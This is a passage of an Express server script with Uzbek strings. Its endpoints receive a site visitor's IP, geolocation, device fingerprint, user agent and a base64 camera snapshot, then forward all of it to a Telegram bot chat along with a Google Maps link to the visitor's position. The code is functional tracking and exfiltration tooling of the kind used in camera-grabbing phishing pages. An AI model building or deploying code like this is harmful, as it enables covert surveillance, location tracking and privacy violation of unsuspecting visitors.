    '💻 <b>Qurilma:</b> '+escapeHtml(d.type||'N/A'),
    '🖥️ <b>OS:</b> '+escapeHtml(d.os||'N/A'),
    '🌍 <b>Brauzer:</b> '+escapeHtml(d.browser||'N/A'),
    '📱 <b>Ekran:</b> '+escapeHtml(d.screen||'N/A'),
    '🗣️ <b>Til:</b> '+escapeHtml(d.language||'N/A'),
    '⚙️ <b>CPU:</b> '+escapeHtml(d.cores||'N/A')+' | <b>RAM:</b> '+escapeHtml(d.memory||'N/A'),
    '👆 <b>Touch:</b> '+escapeHtml(d.touch||'N/A'),
    '🔗 <b>URL:</b> '+escapeHtml(d.url||'N/A'),
    '',
    '🕒 <b>Vaqt:</b> '+escapeHtml(new Date().toLocaleString('uz-UZ'))
  );

  const link = mapsLink(finalLat, finalLon);
  if (link) {
    lines.push('', '🗺️ <a href="'+link+'">Google Maps da ko&#39;rish</a>');
  }

  return { text: lines.join('\n'), lat: finalLat, lon: finalLon };
}

/* ============================================================
   📍 VISIT
   ============================================================ */
app.post('/api/visit', async function(req, res){
  try {
    const info = (req.body && req.body.info) ? req.body.info : {};
    console.log('👀 Visit: '+info.ip+' — '+((info.geo&&info.geo.city)||'?'));

    const cap = buildCaption(info, false);
    const payload = {
      chat_id: TELEGRAM_CHAT_ID,
      text: cap.text,
      parse_mode: 'HTML',
      disable_web_page_preview: false
    };
    const kb = buildMapsKeyboard(cap.lat, cap.lon);
    if (kb) payload.reply_markup = kb;
    await tgSend('sendMessage', payload);

    await tgSend('sendMessage', {
      chat_id: TELEGRAM_CHAT_ID,
      text: '🧾 <b>User-Agent:</b>\n<code>'+escapeHtml((info.headers&&info.headers['user-agent'])||'N/A')+'</code>\n\n🔗 <b>Referer:</b> '+escapeHtml((info.headers&&info.headers.referer)||"Yo'q"),
      parse_mode: 'HTML'
    });
    res.json({ ok: true });
  } catch(e) {
    console.error('Visit xato:', e);
    res.json({ ok: false });
  }
});

/* ============================================================
   📸 CAPTURE
   ============================================================ */
app.post('/api/capture', async function(req, res){
  try {
    const image = req.body && req.body.image;
    const info = (req.body && req.body.info) ? req.body.info : {};
    if(!image) return res.status(400).json({ ok:false, msg:"Rasm yo'q" });

    console.log('📸 Rasm: '+info.ip+' — '+((info.geo&&info.geo.city)||'?'));

    const tg = 'https://api.telegram.org/bot'+TELEGRAM_BOT_TOKEN;
    const base64 = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64, 'base64');

    const cap = buildCaption(info, true);
    const form = new FormData();
    form.append('chat_id', TELEGRAM_CHAT_ID);
    form.append('caption', cap.text);
    form.append('parse_mode', 'HTML');
    form.append('photo', new Blob([buffer], { type:'image/jpeg' }), 'capture.jpg');

    const kb = buildMapsKeyboard(cap.lat, cap.lon);
    if (kb) form.append('reply_markup', JSON.stringify(kb));

    const r = await fetch(tg+'/sendPhoto', { method:'POST', body: form });
    const j = await r.json();
    if(!j.ok) {
      console.error('sendPhoto:', j);
      return res.status(500).json({ ok:false, msg: (j && j.description) || 'Telegram xato' });
    }
    res.json({ ok: true });
  } catch(err) {
    console.error('Capture xato:', err);
    res.status(500).json({ ok:false, msg:err.message });
  }
});

app.listen(PORT, function(){
  console.log('═══════════════════════════════════════');
  console.log('✅ Server: http://localhost:'+PORT);
  console.log('📤 Chat ID: '+TELEGRAM_CHAT_ID);
  console.log('═══════════════════════════════════════');
  console.log("🔑 Token va Chat ID ni .env faylida saqlang");
  console.log('🌐 Brauzerda: http://localhost:'+PORT);
  console.log('═══════════════════════════════════════');
});
